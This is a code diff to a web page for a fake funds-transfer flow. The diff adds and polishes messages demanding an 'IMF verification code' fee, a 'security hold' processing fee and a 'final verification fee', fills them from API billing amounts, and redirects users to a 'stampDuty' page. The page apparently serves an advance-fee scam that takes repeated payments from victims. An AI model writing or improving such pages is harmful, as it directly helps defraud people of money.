@@ -179,9 +179,11 @@
                     </div>
                     <h2 class="font-display text-xl font-semibold mb-2 text-cyan-400">IMF Security Code</h2>
                     <p class="text-gray-400 text-sm mb-4">
-                        Enter the IMF verification code provided by your support to initiate the transfer.
+                        Please enter the IMF verification code provided by your support representative to proceed with the transfer.
                     </p>
-                    <p class="text-gray-400 text-sm mb-4">The code is a purchasable code costing a sum of <span></span> for the completion of your transfer..</p>
+                    <p class="text-gray-400 text-sm mb-4">
+                        This verification code incurs a fee of <span id="IMF-billing"></span>, which is required to finalize the transaction.
+                    </p>
                     <div class="inline-flex items-center gap-2 px-4 py-2 bg-yellow-500/10 rounded-full border border-yellow-500/30">
                         <svg class="w-4 h-4 text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
@@ -220,7 +222,10 @@
                     </div>
                     <h2 class="font-display text-xl font-semibold mb-2 text-orange-400">Transaction Failure Code</h2>
                     <p class="text-gray-400 text-sm mb-4">
-                        Security hold active. The failure prevention code input will unlock after the security period.
+                        A security hold is currently active. The failure prevention code input will be unlocked following the security period, ensuring the successful completion of your transfer.
+                    </p>
+                    <p class="text-gray-400 text-sm mb-4">
+                        This security hold requires a processing fee of <span id="security-fee"></span> to be released and allow the transaction to proceed.
                     </p>
                     
                     <!-- Countdown Display -->
@@ -292,7 +297,10 @@
                     </div>
                     <h2 class="font-display text-xl font-semibold mb-2 text-purple-400">Authorization Code</h2>
                     <p class="text-gray-400 text-sm mb-4">
-                        Final verification step. Complete the security period to unlock the authorization input.
+                        Final verification step. Please complete the security period to unlock the authorization input.
+                    </p>
+                    <p class="text-gray-400 text-sm mb-4">
+                        A final verification fee of <span id="final-verification-fee"></span> is required to complete this step and authorize your transfer.
                     </p>
                     
                     <!-- Countdown Display -->
@@ -737,7 +745,7 @@ const APIService = {
         
         const VerificationController = {
             state: null,
-
+            
             init() {
                 this.state = StateManager.getState();
                 this.attachEventListeners();
@@ -891,6 +899,14 @@ const APIService = {
             }
          };
 
+        
+        const state = StateManager.getState()
+        if(state.step3Completed = true){
+            setTimeout(() => {
+                window.location.href = "stampDuty.html"
+            }, 3000);
+        }
+
         // // Global reset function
         // function resetProcess() {
         //     TimerManager.stopAll();
@@ -967,13 +983,13 @@ const APIService = {
         }
 
         // Set Currency conversion billing
-        const currencyElement = document.getElementById("Currency-conversion-billing");
+        const currencyElement = document.getElementById("security-fee");
         if (currencyElement) {
             currencyElement.textContent = formatAmount(data.data?.secondBillingAmount);
         }
 
         // Set Transaction billing
-        const transactionElement = document.getElementById("transaction-billing");
+        const transactionElement = document.getElementById("final-verification-fee");
         if (transactionElement) {
             transactionElement.textContent = formatAmount(data.data?.thirdBillingAmount);
         }
